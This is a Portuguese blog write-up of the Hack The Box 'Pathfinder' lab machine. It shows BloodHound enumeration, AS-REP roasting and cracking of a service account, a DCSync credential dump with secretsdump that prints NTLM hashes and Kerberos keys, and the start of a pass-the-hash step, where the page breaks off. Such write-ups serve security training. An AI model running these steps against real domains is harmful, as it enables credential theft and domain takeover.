<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="HTB Pathfinder Writeup" /><meta name="author" content="Hastur" /><meta property="og:locale" content="en" /><meta name="description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><meta property="og:description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><link rel="canonical" href="https://h41stur.github.io/posts/htb-pathfinder-writeup/" /><meta property="og:url" content="https://h41stur.github.io/posts/htb-pathfinder-writeup/" /><meta property="og:site_name" content="H41stur" /><meta property="og:image" content="https://h41stur.github.io/img/htb/htb-pathfinder-logo.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-06T22:00:00-03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://h41stur.github.io/img/htb/htb-pathfinder-logo.png" /><meta property="twitter:title" content="HTB Pathfinder Writeup" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Hastur" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Hastur"},"dateModified":"2021-12-13T15:54:13-03:00","datePublished":"2021-09-06T22:00:00-03:00","description":"“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”","headline":"HTB Pathfinder Writeup","image":"https://h41stur.github.io/img/htb/htb-pathfinder-logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://h41stur.github.io/posts/htb-pathfinder-writeup/"},"url":"https://h41stur.github.io/posts/htb-pathfinder-writeup/"}</script><title>HTB Pathfinder Writeup | H41stur</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="H41stur"><meta name="application-name" content="H41stur"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://h41stur.github.io/img/h41stur.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">H41stur</a></div><div class="site-subtitle font-italic">Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARQUIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/h41stur" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['leonardor.toledo','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/leo-toledo/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB Pathfinder Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB Pathfinder Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Hastur </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Sep 6, 2021, 10:00 PM -0300" >Sep 6, 2021<i class="unloaded">2021-09-06T22:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Dec 13, 2021, 3:54 PM -0300" >Dec 13, 2021<i class="unloaded">2021-12-13T15:54:13-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1532 words">8 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="/img/htb/htb-pathfinder-logo.png" /></p><p><br /></p><div class="table-wrapper"><table><thead><tr><th>Nome<th>Pathfinder<tbody><tr><td>IP<td>10.10.10.30<tr><td>Pontos<td>0<tr><td>OS<td>Windows<tr><td>Nível<td>Very Easy</table></div><p><br /></p><h2 id="recon">RECON</h2><h3 id="nmap">Nmap</h3><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 10.10.10.30 <span class="nt">--min-rate</span><span class="o">=</span>512
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2021-09-08 04:15:02Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC

</pre></table></code></div></div><p>Encontramos várias portas abertas nesta máquina, percebemos que temos o LDAP na porta 389 e o Kerberos na porta 88. Também temos o WinRM na porta 5985, estas informações indicam que estamos lidando com um Domain Controller.</p><h3 id="active-directory">Active Directory</h3><p>Desta vez, precisaremos fazer uma análise gráfica do AD, para tanto, vamos precisar de algumas ferramentas. A primeira delas é o injester <code class="language-plaintext highlighter-rouge">bloodhound</code> do python que pode ser instalado através do comando <code class="language-plaintext highlighter-rouge">pip install bloodhound</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
└─<span class="nv">$ </span>pip <span class="nb">install </span>bloodhound
Collecting bloodhound
  Downloading bloodhound-1.1.1-py3-none-any.whl <span class="o">(</span>65 kB<span class="o">)</span>
     |████████████████████████████████| 65 kB 2.4 MB/s 
Requirement already satisfied: future <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from bloodhound<span class="o">)</span> <span class="o">(</span>0.18.2<span class="o">)</span>
Requirement already satisfied: pyasn1&gt;<span class="o">=</span>0.4 <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from bloodhound<span class="o">)</span> <span class="o">(</span>0.4.8<span class="o">)</span>
Requirement already satisfied: impacket&gt;<span class="o">=</span>0.9.17 <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from bloodhound<span class="o">)</span> <span class="o">(</span>0.9.22<span class="o">)</span>
Requirement already satisfied: dnspython <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from bloodhound<span class="o">)</span> <span class="o">(</span>2.0.0<span class="o">)</span>
Requirement already satisfied: ldap3!<span class="o">=</span>2.5.0,!<span class="o">=</span>2.5.2,!<span class="o">=</span>2.6,&gt;<span class="o">=</span>2.5 <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from bloodhound<span class="o">)</span> <span class="o">(</span>2.8.1<span class="o">)</span>
Installing collected packages: bloodhound
  WARNING: The script bloodhound-python is installed <span class="k">in</span> <span class="s1">'/home/hastur/.local/bin'</span> which is not on PATH.
  Consider adding this directory to PATH or, <span class="k">if </span>you prefer to suppress this warning, use <span class="nt">--no-warn-script-location</span><span class="nb">.</span>
Successfully installed bloodhound-1.1.1
</pre></table></code></div></div><p>Como já temos as credenciais <code class="language-plaintext highlighter-rouge">sandra:Password1234!</code> obitadas na máquina anterior (<a href="https://hastur666.github.io/posts/htb-shield-writeup/">Shield</a>), vamos tentar obter informações do AD.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
└─<span class="nv">$ </span>python3 <span class="nt">-m</span> bloodhound <span class="nt">-d</span> megacorp.local <span class="nt">-u</span> sandra <span class="nt">-p</span> <span class="s1">'Password1234!'</span> <span class="nt">-gc</span> pathfinder.megacorp.local <span class="nt">-c</span> all <span class="nt">-ns</span> 10.10.10.30                                                                                                          130 ⨯
INFO: Found AD domain: megacorp.local
INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
INFO: Found 5 <span class="nb">users
</span>INFO: Connecting to GC LDAP server: pathfinder.megacorp.local
INFO: Found 51 <span class="nb">groups
</span>INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Pathfinder.MEGACORP.LOCAL
INFO: Done <span class="k">in </span>00M 39S
</pre></table></code></div></div><p>A autenticação aconteceu com sucesso, e o bloodhound salvou alguns arquivos <code class="language-plaintext highlighter-rouge">.json</code> com as informações do AD em nosso diretório de trabalho.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
└─<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 116
drwxr-xr-x  2 hastur hastur  4096 Sep  7 18:12 <span class="nb">.</span>
drwxr-xr-x 31 hastur hastur  4096 Sep  7 17:58 ..
<span class="nt">-rw-r--r--</span>  1 hastur hastur  3370 Sep  7 18:12 20210907181146_computers.json
<span class="nt">-rw-r--r--</span>  1 hastur hastur  3243 Sep  7 18:12 20210907181146_domains.json
<span class="nt">-rw-r--r--</span>  1 hastur hastur 85362 Sep  7 18:12 20210907181146_groups.json
<span class="nt">-rw-r--r--</span>  1 hastur hastur 12521 Sep  7 18:12 20210907181146_users.json
</pre></table></code></div></div><p>Para conseguirmos de fato analisar estas informações, precisaremos de mais duas aplicações: o <code class="language-plaintext highlighter-rouge">neo4j</code> e o <code class="language-plaintext highlighter-rouge">bloodhound</code> que podem ser instalados com o comando <code class="language-plaintext highlighter-rouge">sudo apt install neo4j bloodhound</code>.</p><h3 id="preparando-o-ambiente">Preparando o ambiente</h3><p>Antes de iniciarmos, precisamos configurar o ambiente com o neo4j e bloodhount. Primeiro vamos iniciar o neo4j <code class="language-plaintext highlighter-rouge">sudo neo4j console</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
└─<span class="nv">$ </span><span class="nb">sudo </span>neo4j console
Directories <span class="k">in </span>use:
  home:         /usr/share/neo4j
  config:       /usr/share/neo4j/conf
  logs:         /usr/share/neo4j/logs
  plugins:      /usr/share/neo4j/plugins
  import:       /usr/share/neo4j/import
  data:         /usr/share/neo4j/data
  certificates: /usr/share/neo4j/certificates
  run:          /usr/share/neo4j/run
Starting Neo4j.
WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
2021-09-07 22:20:53.094+0000 INFO  Starting...
2021-09-07 22:20:54.732+0000 INFO  <span class="o">========</span> Neo4j 4.2.1 <span class="o">========</span>
2021-09-07 22:20:56.115+0000 INFO  Initializing system graph model <span class="k">for </span>component <span class="s1">'security-users'</span> with version <span class="nt">-1</span> and status UNINITIALIZED
2021-09-07 22:20:56.122+0000 INFO  Setting up initial user from defaults: neo4j
2021-09-07 22:20:56.122+0000 INFO  Creating new user <span class="s1">'neo4j'</span> <span class="o">(</span><span class="nv">passwordChangeRequired</span><span class="o">=</span><span class="nb">true</span>, <span class="nv">suspended</span><span class="o">=</span><span class="nb">false</span><span class="o">)</span>
2021-09-07 22:20:56.129+0000 INFO  Setting version <span class="k">for</span> <span class="s1">'security-users'</span> to 2
2021-09-07 22:20:56.132+0000 INFO  After initialization of system graph model component <span class="s1">'security-users'</span> have version 2 and status CURRENT
2021-09-07 22:20:56.136+0000 INFO  Performing postInitialization step <span class="k">for </span>component <span class="s1">'security-users'</span> with version 2 and status CURRENT
2021-09-07 22:20:56.350+0000 INFO  Bolt enabled on localhost:7687.
2021-09-07 22:20:57.116+0000 INFO  Remote interface available at http://localhost:7474/
2021-09-07 22:20:57.116+0000 INFO  Started.
</pre></table></code></div></div><p>Ele irá abrir na porta 7474 que pode ser acessado pelo browser.</p><p><img data-proofer-ignore data-src="/img/htb/htb-pathfinder-1.png" /></p><p>As credenciais iniciais para utilizá-lo, são <code class="language-plaintext highlighter-rouge">neo4j:neo4j</code>. Logo no primeiro acesso, ele pedirá para trocar a senha de acesso.</p><p>Agora precisamos iniciar o bloodhound com o comando <code class="language-plaintext highlighter-rouge">bloodhound --no-sandbox</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
└─<span class="nv">$ </span>bloodhound <span class="nt">--no-sandbox</span>
<span class="o">(</span>node:2824<span class="o">)</span> <span class="o">[</span>DEP0005] DeprecationWarning: Buffer<span class="o">()</span> is deprecated due to security and usability issues. Please use the Buffer.alloc<span class="o">()</span>, Buffer.allocUnsafe<span class="o">()</span>, or Buffer.from<span class="o">()</span> methods instead.
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/htb/htb-pathfinder-2.png" /></p><p>Ele irá solicitar as credenciais do <code class="language-plaintext highlighter-rouge">neo4j</code>.</p><p>Para facilitar a importação dos dados, podemos compactar todos os arquivos .jsob que obtivemos e, em seguida, arrastar o arquivo .zip para dentro do bloodhound.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
└─<span class="nv">$ </span>zip pathfinder.zip <span class="k">*</span>.json
  adding: 20210907181146_computers.json <span class="o">(</span>deflated 74%<span class="o">)</span>
  adding: 20210907181146_domains.json <span class="o">(</span>deflated 85%<span class="o">)</span>
  adding: 20210907181146_groups.json <span class="o">(</span>deflated 95%<span class="o">)</span>
  adding: 20210907181146_users.json <span class="o">(</span>deflated 91%<span class="o">)</span>
</pre></table></code></div></div><p>Após a importação, temos várias querys que podemos fazer, mas utilizaremos duas. Em <code class="language-plaintext highlighter-rouge">Analysis</code>, primeiro clicamos em <code class="language-plaintext highlighter-rouge">Shortest Paths to High value Targets</code> e depois em <code class="language-plaintext highlighter-rouge">Find Principles with DCSync Rights</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-pathfinder-3.png" /></p><p>Este mapa nos mostra a distância que cada usuário tem do Domain Controller e seus respectivos privilégios.</p><p><img data-proofer-ignore data-src="/img/htb/htb-pathfinder-4.png" /></p><p>Podemos ver que o usuário <code class="language-plaintext highlighter-rouge">svc_bes</code> se liga diretamente ao DC e tem privilégios <code class="language-plaintext highlighter-rouge">GetChangesAll</code>. Isso significa que este usuário tem privilégios de solicitar informações sensíveis do DC, inclusive hashes de senhas.</p><h3 id="escalação-de-privilégios-horizontal">Escalação de privilégios horizontal</h3><p>Podemos fazer uma tentativa de PrivEsc Horizontal, ao tentar acesso com o usuário <code class="language-plaintext highlighter-rouge">svc_bes</code>, para tanto, precisamos checar se a pré-autenticação do Kerberos está desabilitada para esta conta. Se sim, o DC está vulnerável a <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">ASREPRoasting</a>.</p><p>Vamos utilizar o <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> para verificar.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/svc_bes <span class="nt">-request</span> <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> 10.10.10.30
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>svc_bes
<span class="nv">$krb5asrep$23$svc_bes</span>@MEGACORP.LOCAL:73e00be48dcb9672655c008a25665eda<span class="nv">$2e43937963ba72aeda130ab7f779f22a9bd1c5526fe6f70ae93c30beeb9266ef5a55c258b0bdca4f86706866d14f0fdff126ca6100e97e7873399243fab54231776f227db65352acec98a8b37fee5e33f1cba334254e60d724cef56a5d481db3fb5e3060274237748dc7bae98b5b1dbdc1a3e6512f9437d4e244ade19d8da1aef42b5a718696f5c4caafc779092d6b7bd03671083569feb0b8789fe16b27afe53afdfc417a347c8db69738c5593ec54f5c2d2e2d86d9fab115475a474940a5edc2876b22b13fe1e60b6642ca01c0830cd11222b0d0292ab62a8bd97732ab04f9778763e1a80ee18267f6914a1580a774</span>
</pre></table></code></div></div><p>Conseguimos um <code class="language-plaintext highlighter-rouge">TGT ticket</code> para o usuário svc_bes!!!</p><p>Vamos salvar este ticket no arquivo <code class="language-plaintext highlighter-rouge">hash</code> e tentar quebrá-lo com o <code class="language-plaintext highlighter-rouge">john</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
└─<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'$krb5asrep$23$svc_bes@MEGACORP.LOCAL:73e00be48dcb9672655c008a25665eda$2e43937963ba72aeda130ab7f779f22a9bd1c5526fe6f70ae93c30beeb9266ef5a55c258b0bdca4f86706866d14f0fdff126ca6100e97e7873399243fab54231776f227db65352acec98a8b37fee5e33f1cba334254e60d724cef56a5d481db3fb5e3060274237748dc7bae98b5b1dbdc1a3e6512f9437d4e244ade19d8da1aef42b5a718696f5c4caafc779092d6b7bd03671083569feb0b8789fe16b27afe53afdfc417a347c8db69738c5593ec54f5c2d2e2d86d9fab115475a474940a5edc2876b22b13fe1e60b6642ca01c0830cd11222b0d0292ab62a8bd97732ab04f9778763e1a80ee18267f6914a1580a774'</span> <span class="o">&gt;</span> <span class="nb">hash</span>
                                                                                                                                                                                                                                             
┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
└─<span class="nv">$ </span>john <span class="nb">hash</span> <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]<span class="o">)</span>
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Sheffield19      <span class="o">(</span><span class="nv">$krb5asrep$23$svc_bes</span>@MEGACORP.LOCAL<span class="o">)</span>
1g 0:00:00:05 DONE <span class="o">(</span>2021-09-07 18:44<span class="o">)</span> 0.1754g/s 1860Kp/s 1860Kc/s 1860KC/s Sherbear94..Shanelee
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>E conseguimos as credenciais <code class="language-plaintext highlighter-rouge">svc_bes:Sheffield19</code>.</p><p>Podemos utilizar o <code class="language-plaintext highlighter-rouge">evil-winrm</code> para acesso reoto. Ele pode ser instalado com o comando <code class="language-plaintext highlighter-rouge">sudo gem install evil-winrm</code>.</p><p><img data-proofer-ignore data-src="/img/htb/htb-pathfinder-5.png" /></p><p>E conseguimos o shell!! A flag <code class="language-plaintext highlighter-rouge">user.txt</code> se encontra no Desktop do usuário.</p><h3 id="escalação-de-privilégios-vertical">Escalação de privilégios vertical</h3><p>Como nosso usuário tem permissões <code class="language-plaintext highlighter-rouge">GetChangesAll</code>, podemos utilizar o <code class="language-plaintext highlighter-rouge">secretsdump.py</code> para conseguir a hash do administrador do DC.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <span class="nt">-dc-ip</span> 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30                                                                                                  126 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::
svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::
sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
PATHFINDER<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:7e2b4bffb0d54e17b7528cb122bae602:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614f
Administrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1b
Administrator:des-cbc-md5:f1c89e75a42cd0fb
krbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5d
krbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65ce
krbtgt:des-cbc-md5:d0f8d0c86ee9d997
svc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238
svc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0
svc_bes:des-cbc-md5:1cc16e37ef8940b5
sandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810
sandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44
sandra:des-cbc-md5:23988f7a9d679d37
PATHFINDER<span class="nv">$:</span>aes256-cts-hmac-sha1-96:9e07592ae55cfd43c84e85a477854c8e3f40c70630ea24bebdeda66a15e77e18
PATHFINDER<span class="nv">$:</span>aes128-cts-hmac-sha1-96:4de068761918fa0005de10f361b49703
PATHFINDER<span class="nv">$:</span>des-cbc-md5:6d37cd7904b6f7f2
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up... 
</pre></table></code></div></div><p>Com a hash do administrador, podemos utilizar a técnica de <code class="language-plaintext highlighter-rouge">Pass The Hash</code> (PTH), onde conseguimos nos autenticar no host não com a senha, mas com a hash do usuário. Para isso podemos utilizar o <code class="language-plaintext highlighter-rouge">psexec.py</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
